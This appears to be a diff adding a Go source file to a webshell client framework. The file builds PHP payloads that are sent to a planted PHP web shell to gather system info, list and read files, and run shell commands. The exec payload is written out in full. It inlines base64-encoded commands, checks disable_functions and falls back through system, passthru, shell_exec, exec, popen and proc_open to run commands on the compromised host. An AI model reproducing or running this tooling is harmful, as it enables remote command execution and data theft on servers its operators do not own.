@@ -1,0 +1,405 @@
+package php
+
+import (
+	"context"
+	"errors"
+
+	"github.com/yliken/redbeanshellcore/core"
+)
+
+// phpInfo 是 Info 操作的 PHP 适配器版本。
+//  core 的 ops.InfoOperation 只能生成一个字面 payload，对 PHP Shell 不够用——
+//  PHP Shell 实际上要 eval 一段 PHP 代码才能拿到系统信息。
+//  这里用 PHPTemplates 生成真正能执行的源码并写入 payload。
+type phpInfo struct {
+	tpl *PHPTemplates
+}
+
+// NewPhpInfo 构建一个 PHP 兼容的 Info 操作。
+func NewPhpInfo() *phpInfo { return &phpInfo{tpl: NewPHPTemplates()} }
+
+func (p *phpInfo) Name() string { return "info" }
+
+// Build 填入从模板渲染出来的真实 PHP 源码。
+func (p *phpInfo) Build(_ context.Context, sess *core.Session) (*core.Request, error) {
+	req := core.NewRequest(p.Name())
+	code, _ := p.tpl.Info()
+	req.Payload = []byte(code)
+	req.Meta["adapter"] = "php"
+	_ = sess
+	return req, nil
+}
+
+func (p *phpInfo) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
+	if resp == nil {
+		return nil, errors.New("phpInfo.Parse: 响应为空")
+	}
+	return parseInfo(string(resp.Body), resp.Body), nil
+}
+
+// phpFileList 是 FileList 操作的 PHP 适配器版本。
+type phpFileList struct {
+	tpl    *PHPTemplates
+	target string
+}
+
+// NewPhpFileList 构建一个 FileList 操作。
+func NewPhpFileList(path string) *phpFileList {
+	if path == "" {
+		path = "/"
+	}
+	return &phpFileList{tpl: NewPHPTemplates(), target: path}
+}
+
+func (p *phpFileList) Name() string { return "file.list" }
+
+func (p *phpFileList) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
+	req := core.NewRequest(p.Name())
+	code, placeholders := p.tpl.FileList()
+	// 把路径参数填充进 base64 占位符（路径名 base64 字段约定为 "path"）。
+	req.SetParam("path", []byte(p.target))
+	req.Meta["php_placeholders"] = placeholdersToMeta(placeholders)
+	req.Payload = []byte(code)
+	req.Meta["adapter"] = "php"
+	return req, nil
+}
+
+func (p *phpFileList) Parse(ctx context.Context, resp *core.Response) (core.Result, error) {
+	if resp == nil {
+		return nil, errors.New("phpFileList.Parse: 响应为空")
+	}
+	// 复用核心 FileList 的 tab 分隔解析逻辑。
+	return parseFileList(p.target, resp.Body), nil
+}
+
+// phpFileRead 是 FileRead 操作的 PHP 适配器版本。
+type phpFileRead struct {
+	tpl    *PHPTemplates
+	target string
+}
+
+// NewPhpFileRead 构建一个 FileRead 操作。
+func NewPhpFileRead(path string) *phpFileRead {
+	return &phpFileRead{tpl: NewPHPTemplates(), target: path}
+}
+
+func (p *phpFileRead) Name() string { return "file.read" }
+
+func (p *phpFileRead) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
+	req := core.NewRequest(p.Name())
+	code, _ := p.tpl.FileRead()
+	req.SetParam("path", []byte(p.target))
+	req.Payload = []byte(code)
+	req.Meta["adapter"] = "php"
+	return req, nil
+}
+
+func (p *phpFileRead) Parse(ctx context.Context, resp *core.Response) (core.Result, error) {
+	if resp == nil {
+		return nil, errors.New("phpFileRead.Parse: 响应为空")
+	}
+	return parseFileRead(p.target, resp.Body), nil
+}
+
+// phpExec 是 Exec 操作的 PHP 适配器版本。
+type phpExec struct {
+	tpl    *PHPTemplates
+	cmd    string
+	bin    string
+	envars map[string]string
+}
+
+// NewPhpExec 创建一个 PHP 兼容的 Exec 操作。
+func NewPhpExec(cmd string) *phpExec {
+	return &phpExec{tpl: NewPHPTemplates(), cmd: cmd, bin: "/bin/sh"}
+}
+
+func (p *phpExec) Name() string { return "exec" }
+
+func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
+	req := core.NewRequest(p.Name())
+
+	// 自包含方案：直接把参数值 base64 编码后内联到 PHP 源码里，
+	// 替换 $_POST['xxx'] 为字面量 base64 字符串。
+	// 这样 PHP 源码不依赖任何外部 POST 字段，eval 即可执行。
+	binB64 := b64(p.bin)
+	cmdB64 := b64(p.cmd)
+
+	var envStr string
+	if len(p.envars) > 0 {
+		var pairs []string
+		for k, v := range p.envars {
+			pairs = append(pairs, k+"|||askey|||"+v)
+		}
+		envStr = joinLines(pairs, "|||asline|||")
+	}
+	envB64 := b64(envStr)
+
+	// 构造自包含 PHP 源码：把 base64_decode($_POST['xxx']) 替换成
+	// base64_decode('xxx')，让 eval 直接拿到解码后的值。
+	code := "" +
+		"$p=base64_decode('" + binB64 + "');" +
+		"$s=base64_decode('" + cmdB64 + "');" +
+		"$envstr=@base64_decode('" + envB64 + "');" +
+		"$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
+		"$c=(substr($d,0,1)=='/')?'-c ' . '\"' . $s . '\"' : '/c ' . '\"' . $s . '\"';" +
+		"if(substr($d,0,1)=='/'){" +
+		"  @putenv('PATH=' . getenv('PATH') . ':/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');" +
+		"}else{" +
+		"  @putenv('PATH=' . getenv('PATH') . ';C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;');" +
+		"}" +
+		"if(!empty($envstr)){$envarr=explode('|||asline|||',$envstr);foreach($envarr as $v){if(!empty($v)){@putenv(str_replace('|||askey|||','=',$v));}}}" +
+		"$r=$p.' '.$c;" +
+		"function fe($f){$d=explode(',',@ini_get('disable_functions'));" +
+		"if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}" +
+		"return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));}" +
+		"function runcmd($c){$ret=0;$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
+		"if(fe('system')){@system($c,$ret);}" +
+		"elseif(fe('passthru')){@passthru($c,$ret);}" +
+		"elseif(fe('shell_exec')){print(@shell_exec($c));}" +
+		"elseif(fe('exec')){@exec($c,$o,$ret);print(join(\"\\n\",$o));}" +
+		"elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
+		"elseif(fe('proc_open')){$p=@proc_open($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}$ret=0;@fclose($io[1]);@fclose($io[2]);@proc_close($p);}" +
+		"else{$ret=127;}" +
+		"return $ret;}" +
+		"$ret=@runcmd($r . ' 2>&1');" +
+		"if($ret!=0){echo 'ret=' . $ret;}"
+
+	_ = p.tpl // 保留引用避免 unused
+
+	req.Payload = []byte(code)
+	req.Meta["adapter"] = "php"
+	return req, nil
+}
+
+// WithBin 指定非默认 shell 路径（例如 C:\Windows\system32\cmd.exe）。
+func (p *phpExec) WithBin(bin string) *phpExec {
+	p.bin = bin
+	return p
+}
+
+// WithEnv 追加注入的环境变量。
+func (p *phpExec) WithEnv(key, value string) *phpExec {
+	if p.envars == nil {
+		p.envars = make(map[string]string)
+	}
+	p.envars[key] = value
+	return p
+}
+
+func (p *phpExec) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
+	if resp == nil {
+		return nil, errors.New("phpExec.Parse: 响应为空")
+	}
+	return parseExec(resp.Body), nil
+}
+
+// 下面是各种操作的解析逻辑。
+
+func parseInfo(raw string, body []byte) core.Result {
+	parts := splitTab(raw)
+	res := &core.InfoResult{BaseResult: core.NewBaseResult("info", body)}
+	switch {
+	case len(parts) >= 4:
+		res.Workdir = parts[0]
+		// parts[1] 是驱动器列表，已包含在 Raw 里
+		res.OS = parts[2]
+		res.User = parts[3]
+	case len(parts) >= 1:
+		res.OS = parts[0]
+	}
+	return res
+}
+
+func parseFileList(target string, body []byte) core.Result {
+	lines := splitLines(string(body))
+	var entries []core.FileEntry
+	for _, line := range lines {
+		line = trimRight(line, "\t\n")
+		if len(line) == 0 {
+			continue
+		}
+		name, rest, ok := cutTab(line)
+		if !ok {
+			continue
+		}
+		detail := splitTab(rest)
+		if len(detail) < 3 {
+			continue
+		}
+		// detail[0]=modtime, [1]=size, [2]=mode
+		entries = append(entries, core.FileEntry{
+			Name:  name,
+			IsDir: suffix(name, "/"),
+		})
+	}
+	return &core.FileListResult{
+		BaseResult: core.NewBaseResult("file.list", body),
+		Path:       target,
+		Entries:    entries,
+	}
+}
+
+func parseFileRead(target string, body []byte) core.Result {
+	data := make([]byte, len(body))
+	copy(data, body)
+	return &core.FileReadResult{
+		BaseResult: core.NewBaseResult("file.read", body),
+		Path:       target,
+		Data:       data,
+	}
+}
+
+func parseExec(body []byte) core.Result {
+	return &core.ExecResult{
+		BaseResult: core.NewBaseResult("exec", body),
+		Stdout:     string(body),
+	}
+}
+
+// 工具函数（为了自包含写了少量辅助函数）。
+
+func splitTab(s string) []string {
+	var out []string
+	cur := ""
+	for _, r := range s {
+		if r == '\t' {
+			out = append(out, cur)
+			cur = ""
+			continue
+		}
+		cur += string(r)
+	}
+	out = append(out, cur)
+	return out
+}
+
+func splitLines(s string) []string {
+	var out []string
+	cur := ""
+	for _, r := range s {
+		if r == '\n' {
+			out = append(out, cur)
+			cur = ""
+			continue
+		}
+		if r == '\r' {
+			continue
+		}
+		cur += string(r)
+	}
+	if cur != "" {
+		out = append(out, cur)
+	}
+	return out
+}
+
+func cutTab(s string) (string, string, bool) {
+	for i, r := range s {
+		if r == '\t' {
+			return s[:i], s[i+1:], true
+		}
+	}
+	return "", "", false
+}
+
+func trimRight(s string, cuts string) string {
+loop:
+	for len(s) > 0 {
+		c := s[len(s)-1:]
+		for _, r := range cuts {
+			if string(r) == c {
+				s = s[:len(s)-1]
+				continue loop
+			}
+		}
+		return s
+	}
+	return s
+}
+
+func suffix(s, suf string) bool {
+	return len(s) >= len(suf) && s[len(s)-len(suf):] == suf
+}
+
+func joinLines(parts []string, sep string) string {
+	out := ""
+	for i, p := range parts {
+		if i > 0 {
+			out += sep
+		}
+		out += p
+	}
+	return out
+}
+
+func placeholdersToMeta(m map[string]string) string {
+	out := ""
+	for k, v := range m {
+		out += k + "=" + v + "\n"
+	}
+	return out
+}
+
+func replaceAll(s, old, new string) string {
+	if old == "" {
+		return s
+	}
+	out := ""
+	for {
+		idx := indexOf(s, old)
+		if idx < 0 {
+			return out + s
+		}
+		out += s[:idx] + new
+		s = s[idx+len(old):]
+	}
+}
+
+func indexOf(s, sub string) int {
+	if sub == "" {
+		return 0
+	}
+	for i := 0; i+len(sub) <= len(s); i++ {
+		if s[i:i+len(sub)] == sub {
+			return i
+		}
+	}
+	return -1
+}
+
+func b64(s string) string {
+	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+	if s == "" {
+		return ""
+	}
+	var out []byte
+	b := []byte(s)
+	n := len(b)
+	for i := 0; i < n; i += 3 {
+		var v, pad int
+		switch {
+		case i+2 < n:
+			v = int(b[i])<<16 | int(b[i+1])<<8 | int(b[i+2])
+		case i+1 < n:
+			v = int(b[i])<<16 | int(b[i+1])<<8
+			pad = 1
+		default:
+			v = int(b[i]) << 16
+			pad = 2
+		}
+		out = append(out, chars[(v>>18)&63])
+		out = append(out, chars[(v>>12)&63])
+		if pad < 2 {
+			out = append(out, chars[(v>>6)&63])
+		} else {
+			out = append(out, '=')
+		}
+		if pad < 1 {
+			out = append(out, chars[v&63])
+		} else {
+			out = append(out, '=')
+		}
+	}
+	return string(out)
+}
